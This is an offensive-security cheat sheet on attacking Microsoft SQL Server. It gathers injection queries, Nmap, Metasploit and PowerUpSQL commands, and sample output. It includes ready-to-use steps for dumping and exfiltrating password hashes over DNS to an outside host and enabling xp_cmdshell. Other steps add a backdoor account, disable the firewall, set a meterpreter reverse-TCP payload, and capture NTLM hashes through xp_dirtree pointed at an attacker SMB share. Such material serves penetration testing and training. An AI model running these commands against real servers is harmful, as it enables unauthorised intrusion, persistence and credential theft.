---
description: >-
  Microsoft SQL Server is a relational database management system developed by
  Microsoft.
---

# 1433 - Microsoft SQL

Normal Port - 1433

Hidden mode port - 2433

## Connect

Connect using one of the following options: 

1. sqsh -S someserver -L user=sa -L password=password 
2.  metasploit \(mssql\_login\) 
3. Impacket script [mssqclient](../../tools/impacket.md#mssqlclient) 
4. sqlcmd. To use SQL Server Authentication, you must specify a user name and password by using the -U and -P options.
5. crackmapexec

## MSSQL 2003 commands

taken from: [http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)

<table>
  <thead>
    <tr>
      <th style="text-align:left">Task</th>
      <th style="text-align:left">Command</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">Version</td>
      <td style="text-align:left">SELECT @@version</td>
    </tr>
    <tr>
      <td style="text-align:left">Comments</td>
      <td style="text-align:left">
        <p>SELECT 1 -- comment</p>
        <p>SELECT /*comment*/1</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Current User</td>
      <td style="text-align:left">
        <p>SELECT user_name();</p>
        <p>SELECT system_user;</p>
        <p>SELECT user;</p>
        <p>SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">List Users</td>
      <td style="text-align:left">SELECT name FROM master..syslogins</td>
    </tr>
    <tr>
      <td style="text-align:left">List Password Hashes</td>
      <td style="text-align:left">
        <p>SELECT name, password FROM master..sysxlogins -- priv, mssql 2000;</p>
        <p>SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
          -- priv, mssql 2000. Need to convert to hex to return hashes in MSSQL error
          message / some version of query analyzer.</p>
        <p>SELECT name, password_hash FROM master.sys.sql_logins -- priv, mssql 2005;</p>
        <p>SELECT name + &apos;-&apos; + master.sys.fn_varbintohexstr(password_hash)
          from master.sys.sql_logins -- priv, mssql 2005</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Password Cracker</td>
      <td style="text-align:left">MSSQL 2000 and 2005 Hashes are both SHA1-based.&#x202F;<a href="https://labs.portcullis.co.uk/application/phrasen-drescher/">phrasen|drescher</a>&#x202F;can
        crack these.</td>
    </tr>
    <tr>
      <td style="text-align:left">List Privileges</td>
      <td style="text-align:left">Impossible?</td>
    </tr>
    <tr>
      <td style="text-align:left">List DBA Accounts</td>
      <td style="text-align:left">
        <p>TODO</p>
        <p>SELECT is_srvrolemember(&apos;sysadmin&apos;); --priv</p>
        <p>-- is your account a sysadmin? returns 1 for true, 0 for false, NULL for
          invalid role. Also try &apos;bulkadmin&apos;, &apos;systemadmin&apos; and
          other values from the&#x202F;<a href="http://msdn.microsoft.com/en-us/library/ms176015.aspx">documentation</a>SELECT
          is_srvrolemember(&apos;sysadmin&apos;, &apos;sa&apos;); -- is sa a sysadmin?
          return 1 for true, 0 for false, NULL for invalid role/username.</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Current Database</td>
      <td style="text-align:left">SELECT DB_NAME()</td>
    </tr>
    <tr>
      <td style="text-align:left">List Databases</td>
      <td style="text-align:left">
        <p>SELECT name FROM master..sysdatabases;</p>
        <p>SELECT DB_NAME(N); -- for N = 0, 1, 2, ...</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">List Columns</td>
      <td style="text-align:left">
        <p>SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE
          name = &apos;mytable&apos;); -- for the current DB only</p>
        <p>SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM
          master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id
          AND master..sysobjects.name=&apos;sometable&apos;; -- list colum names
          and types for master..sometable</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">List Tables</td>
      <td style="text-align:left">
        <p>SELECT name FROM master..sysobjects WHERE xtype = &apos;U&apos;; -- use
          xtype = &apos;V&apos; for views</p>
        <p>SELECT name FROM someotherdb..sysobjects WHERE xtype = &apos;U&apos;;</p>
        <p>SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM
          master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id
          AND master..sysobjects.name=&apos;sometable&apos;; -- list colum names
          and types for master..sometable</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Find Tables From Column Name</td>
      <td style="text-align:left">
        <p>-- NB: This example works only for the current database. If you wan&apos;t
          to search another db, you need to specify the db name (e.g. replace sysobject
          with mydb..sysobjects).</p>
        <p>SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM
          sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype
          = &apos;U&apos; AND syscolumns.name LIKE &apos;%PASSWORD%&apos; -- this
          lists table, column for each column containing the word &apos;password&apos;</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Select Nth Row</td>
      <td style="text-align:left">SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER
        BY name ASC) sq ORDER BY name DESC -- gets 9th row</td>
    </tr>
    <tr>
      <td style="text-align:left">Select Nth Char</td>
      <td style="text-align:left">SELECT substring(&apos;abcd&apos;, 3, 1) -- returns c</td>
    </tr>
    <tr>
      <td style="text-align:left">Bitwise AND</td>
      <td style="text-align:left">
        <p>SELECT 6 &amp; 2 -- returns 2</p>
        <p>SELECT 6 &amp; 1 -- returns 0</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">ASCII Value -&gt; Char</td>
      <td style="text-align:left">SELECT char(0x41) -- returns A</td>
    </tr>
    <tr>
      <td style="text-align:left">Char -&gt; ASCII Value</td>
      <td style="text-align:left">SELECT ascii(&apos;A&apos;) - returns 65</td>
    </tr>
    <tr>
      <td style="text-align:left">Casting</td>
      <td style="text-align:left">
        <p>SELECT CAST(&apos;1&apos; as int);</p>
        <p>SELECT CAST(1 as char)</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">String Concatenation</td>
      <td style="text-align:left">SELECT &apos;A&apos; + &apos;B&apos; - returns AB</td>
    </tr>
    <tr>
      <td style="text-align:left">If Statement</td>
      <td style="text-align:left">IF (1=1) SELECT 1 ELSE SELECT 2 -- returns 1</td>
    </tr>
    <tr>
      <td style="text-align:left">Case Statement</td>
      <td style="text-align:left">SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END -- returns 1</td>
    </tr>
    <tr>
      <td style="text-align:left">Avoiding Quotes</td>
      <td style="text-align:left">SELECT char(65)+char(66) -- returns AB</td>
    </tr>
    <tr>
      <td style="text-align:left">Time Delay</td>
      <td style="text-align:left">WAITFOR DELAY &apos;0:0:5&apos; -- pause for 5 seconds</td>
    </tr>
    <tr>
      <td style="text-align:left">Make DNS Requests</td>
      <td style="text-align:left">
        <p>declare @host varchar(800); select @host = name FROM master..syslogins;
          exec(&apos;master..xp_getfiledetails &apos;&apos;\\&apos; + @host + &apos;\c$\boot.ini&apos;&apos;&apos;);
          -- nonpriv, works on 2000</p>
        <p>declare @host varchar(800); select @host = name + &apos;-&apos; + master.sys.fn_varbintohexstr(password_hash)
          + &apos;.2.pentestmonkey.net&apos; from sys.sql_logins; exec(&apos;xp_fileexist
          &apos;&apos;\\&apos; + @host + &apos;\c$\boot.ini&apos;&apos;&apos;); --
          priv, works on 2005</p>
        <p>-- NB: Concatenation is not allowed in calls to these SPs, hence why we
          have to use @host. Messy but necessary.</p>
        <p>-- Also check out theDNS tunnel feature of&#x202F;<a href="http://sqlninja.sourceforge.net/sqlninja-howto.html">sqlninja</a> 
        </p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Command Execution</td>
      <td style="text-align:left">
        <p>EXEC xp_cmdshell &apos;net user&apos;; -- priv</p>
        <p>On MSSQL 2005 you may need to reactivate xp_cmdshell first as it&apos;s
          disabled by default:</p>
        <p>EXEC sp_configure &apos;show advanced options&apos;, 1; -- priv</p>
        <p>RECONFIGURE; -- priv</p>
        <p>EXEC sp_configure &apos;xp_cmdshell&apos;, 1; -- priv</p>
        <p>RECONFIGURE; -- priv</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Local File Access</td>
      <td style="text-align:left">
        <p>CREATE TABLE mydata (line varchar(8000));</p>
        <p>BULK INSERT mydata FROM &apos;c:\boot.ini&apos;;</p>
        <p>DROP TABLE mydata;</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Hostname, IP Address</td>
      <td style="text-align:left">SELECT HOST_NAME()</td>
    </tr>
    <tr>
      <td style="text-align:left">Create Users</td>
      <td style="text-align:left">EXEC&#x202F;<a href="http://msdn2.microsoft.com/en-us/library/ms173768.aspx">sp_addlogin</a>&#x202F;&apos;user&apos;,
        &apos;pass&apos;; -- priv</td>
    </tr>
    <tr>
      <td style="text-align:left">Drop Users</td>
      <td style="text-align:left">EXEC&#x202F;<a href="http://msdn2.microsoft.com/en-us/library/ms189767.aspx">sp_droplogin</a>&#x202F;&apos;user&apos;;
        -- priv</td>
    </tr>
    <tr>
      <td style="text-align:left">Make User DBA</td>
      <td style="text-align:left">EXEC&#x202F;<a href="http://msdn2.microsoft.com/en-us/library/ms186320.aspx">master.dbo.sp_addsrvrolemember</a>&#x202F;&apos;user&apos;,
        &apos;sysadmin; -- priv</td>
    </tr>
    <tr>
      <td style="text-align:left">Location of DB files</td>
      <td style="text-align:left">TODO</td>
    </tr>
    <tr>
      <td style="text-align:left">Default/System Databases</td>
      <td style="text-align:left">
        <p>northwind</p>
        <p>model</p>
        <p>msdb</p>
        <p>pubs</p>
        <p>tempdb</p>
      </td>
    </tr>
  </tbody>
</table>## MSSQL 2017 Commands

Current user’s permissions:

```text
SQL> SELECT * FROM fn_my_permissions(NULL, 'SERVER'); 
entity_name    subentity_name    permission_name 
------------   ---------------   ------------------ 
server                           CONNECT SQL 
server                           VIEW ANY DATABASE
```

Check out the databases available: 

```text
SQL> SELECT name FROM master.sys.databases 
name 
----------- 
master 
tempdb 
model 
msdb 
volume 
```

I can look for user generated tables on those databases: 

```text
SQL> use volume 
[*] ENVCHANGE(DATABASE): Old Value: volume, New Value: volume 
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'. 
SQL> SELECT name FROM sysobjects WHERE xtype = 'U' 
name 
------------     
```

## Enumeration

### Nmap

Scan:

`nmap -sU --script=ms-sql-info 192.168.1.108` 

Dump hashes: 

`nmap -p1433 --script ms-sql-empty-password,ms-sql-dump-hashes <target>` 

Execute command: 

`nmap -Pn -n -sS –script=ms-sql-xp-cmdshell.nse <victim_ip> -p1433 –script-args mssql.username=sa,mssql.password=<sql_password>,ms-sql-xp-cmdshell.cmd=”net user backdoor backdoor123 /add”`

### Metasploit

#### Find MSSQL servers: 

`msf > use auxiliary/scanner/mssql/mssql_ping` 

#### Bruteforce MSSQL Login 

`msf > use auxiliary/admin/mssql/mssql_login` 

#### Metasploit MSSQL Shell 

```text
msf > use exploit/windows/mssql/mssql_payload 
msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
```

#### mssql\_enum  

The mssql\_enum is an admin module that will accept a set of credentials and query a MSSQL for various configuration settings. 

```text
msf auxiliary(mssql_enum) > run 
[*] Running MS SQL Server Enumeration... 
[*] Version: 
[*] Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86)  
[*] Oct 14 2005 00:33:37  
[*] Copyright (c) 1988-2005 Microsoft Corporation 
[*] Express Edition on Windows NT 5.1 (Build 2600: Service Pack 2) 
[*] Configuration Parameters: 
[*] C2 Audit Mode is Not Enabled 
[*] xp_cmdshell is Not Enabled 
[*] remote access is Enabled 
[*] allow updates is Not Enabled 
[*] Database Mail XPs is Not Enabled 
[*] Ole Automation Procedures are Not Enabled 
[*] Databases on the server: 
[*] Database name:master 
[*] Database Files for master: 
[*] c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\master.mdf 
[*] c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\mastlog.ldf 
[*] Database name:tempdb 
[*] Database Files for tempdb: 
[*] c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\tempdb.mdf 
[*] c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\templog.ldf 
[*] Database name:model 
[*] Database Files for model: 
[*] c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\model.mdf 
[*] c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\modellog.ldf 
[*] Database name:msdb 
[*] Database Files for msdb: 
[*] c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\MSDBData.mdf 
[*] c:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\MSDBLog.ldf 
[*] System Logins on this Server: 
[*] sa 
[*] ##MS_SQLResourceSigningCertificate## 
[*] ##MS_SQLReplicationSigningCertificate## 
[*] ##MS_SQLAuthenticatorCertificate## 
[*] ##MS_AgentSigningCertificate## 
[*] BUILTIN\Administrators 
[*] NT AUTHORITY\SYSTEM 
[*] V-MAC-XP\SQLServer2005MSSQLUser$V-MAC-XP$SQLEXPRESS 
[*] BUILTIN\Users 
[*] Disabled Accounts: 
[*] No Disabled Logins Found 
```

#### mssql\_exec 

The mssql\_exec admin module takes advantage of the xp\_cmdshell stored procedure to execute commands on the remote system. If you have acquired or guessed MSSQL admin credentials, this can be a very useful module. 

```text
msf auxiliary(mssql_exec) > set CMD netsh firewall set opmode disable 
CMD => netsh firewall set opmode disable 
msf auxiliary(mssql_exec) > set PASSWORD password1 
PASSWORD => password1 
msf auxiliary(mssql_exec) > set RHOST 192.168.1.195 
RHOST => 192.168.1.195 
msf auxiliary(mssql_exec) > run 
[*] The server may have xp_cmdshell disabled, trying to enable it... 
[*] SQL Query: EXEC master..xp_cmdshell 'netsh firewall set opmode disable' 
 output 
 ------ 
 Ok. 
[*] Auxiliary module execution completed 
msf auxiliary(mssql_exec) > 
```

### PowerUpSQL

PowerUpSQL: A PowerShell Toolkit for Attacking SQL Server 

Link: [https://github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) 

Example: 

```text
PS /opt/PowerUpSQL> Import-Module .\PowerUpSQL.ps1  
PS /opt/PowerUpSQL> Get-SQLInstanceDomain -Verbose 
VERBOSE: Grabbing SPNs from the domain for SQL Servers (MSSQL*)... 
VERBOSE: 0 SPNs found. 
VERBOSE: Parsing SQL Server instances from SPNs... 
VERBOSE: 0 instances were found. 
```

#### SQL Server Discovery Cheats 

<table>
  <thead>
    <tr>
      <th style="text-align:left">Description</th>
      <th style="text-align:left">Command</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">Discover Local SQL Server Instances</td>
      <td style="text-align:left">Get-SQLInstanceLocal -Verbose</td>
    </tr>
    <tr>
      <td style="text-align:left">Discover Remote SQL Server Instances</td>
      <td style="text-align:left">
        <p>UDP Broadcast Ping</p>
        <p>Get-SQLInstanceBroadcast -Verbose</p>
        <p>UDP Port Scan</p>
        <p>Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1</p>
        <p>Get the instance list from a file</p>
        <p>Get-SQLInstanceFile -FilePath c:\temp\computers.txt | Get-SQLInstanceScanUDPThreaded
          -Verbose</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Discover Active Directory Domain SQL Server Instances</td>
      <td style="text-align:left">Get-SQLInstanceDomain -Verbose</td>
    </tr>
    <tr>
      <td style="text-align:left">Discover Active Directory Domain SQL Server Instances using alternative
        domain credentials</td>
      <td style="text-align:left">
        <p>runas /noprofile /netonly /user:domain\user PowerShell.exe</p>
        <p>import-module PowerUpSQL.psd1</p>
        <p>Get-SQLInstanceDomain -Verbose -DomainController 192.168.1.1 -Username
          domain\user -password P@ssword123</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">List SQL Servers using a specific domain account</td>
      <td style="text-align:left">Get-SQLInstanceDomain -Verbose -DomainAccount SQLSvc</td>
    </tr>
    <tr>
      <td style="text-align:left">List shared domain user SQL Server service accounts</td>
      <td style="text-align:left">Get-SQLInstanceDomain -Verbose | Group-Object DomainAccount | Sort-Object
        count -Descending | select Count,Name | Where-Object {($_.name -notlike
        &quot;*$&quot;) -and ($_.count -gt 1) }</td>
    </tr>
  </tbody>
</table>More commands can be found in the github repo.

## Enable xp\_cmdshell

### Check if enabled 

```text
EXEC xp_cmdshell 'net user'; -- priv 
Or 
EXEC master.dbo.xp_cmdshell 'cmd'; 
```

### Enable xp\_cmdshell

```text
EXEC sp_configure 'show advanced options', 1; -- priv 
RECONFIGURE; -- priv 
EXEC sp_configure 'xp_cmdshell', 1; -- priv 
RECONFIGURE; -- priv 
or 
EXEC sp_configure 'show advanced options', 1; 
EXEC sp_configure reconfigure; 
EXEC sp_configure 'xp_cmdshell', 1; 
EXEC sp_configure reconfigure; 
```

### Check if it works

`xp_cmdshell 'dir C:\'` 

## Capture credentials using xp\_dirtree

Capture credentials using responder and xp\_dirtree: 

Start Responder: 

`root@kali# responder -I eth0` 

Issue the connect to load a file using xp\_dirtree from an SMB share \(that doesn’t exist\) on our host:

```text
SQL> xp_dirtree '\\10.10.14.14\a'; 
subdirectory    depth 
```

It doesn’t return anything, but in the responder window, I’ve captured the necessary information: 

```text
[SMBv2] NTLMv2-SSP Client   : 10.10.10.125 
[SMBv2] NTLMv2-SSP Username : QUERIER\mssql-svc 
[SMBv2] NTLMv2-SSP Hash     : mssql-svc::QUERIER:603386f497f
[*] Skipping previously captured hash for QUERIER\mssql-svc 
```



